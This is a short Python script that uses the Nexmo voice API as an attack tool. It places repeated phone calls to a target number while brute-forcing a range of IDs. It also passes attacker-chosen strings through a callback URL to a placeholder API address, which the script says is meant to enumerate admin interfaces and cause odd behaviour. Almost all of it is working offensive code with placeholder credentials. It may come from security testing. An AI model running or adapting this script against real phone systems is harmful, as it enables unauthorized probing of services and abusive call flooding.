import nexmo
import sys, urllib.parse
from pprint import pprint

client=nexmo.Client(application_id='PUT NEXMO APPLICATION ID HERE',private_key='PUT PATH TO API PRIVATE KEY HERE',)
did_you_use_it_good=False
def call_creation_id(personal_id):
  response = client.create_call({'to':[{'type':'phone','number':'PUT NUMBER TO CALL TO HERE'}],'from':{'type':'phone','number':'00'},"answer_url":["http://PUT_API_ADDRESS_HERE/nexmo/api/answering/"+str(personal_id)],'length_timer':50})
  pprint("sending call for id " + str(personal_id))

def call_creation_strings(strings_to_send):
  response = client.create_call({'to':[{'type':'phone','number':'PUT NUMBER TO CALL TO HERE'}],'from':{'type':'phone','number':'00'},"answer_url":["http://PUT_API_ADDRESS_HERE/nexmo/api/answering_strings/"+str(strings_to_send)],'length_timer':50})
  pprint("sending call for these strings " + str(strings_to_send))

if (sys.argv[1]=='id'):
  pprint('You chose ID bruteforcing by range - argv2 is the range start, argv3 is the end')
  for x in range(int(sys.argv[2]),int(sys.argv[3])):
    call_creation_id(x)
  did_you_use_it_good=True

if (sys.argv[1]=='strings'):
  pprint('You chose sending strings to enumerate admin interfaces and cause weird behaviors')
  call_creation_strings((urllib.parse.quote(sys.argv[2])))
  did_you_use_it_good=True

if(did_you_use_it_good):
  pprint('Finished, look at your API')
else:
  pprint('You did not choose a valid option, either choose "id" or "strings"')


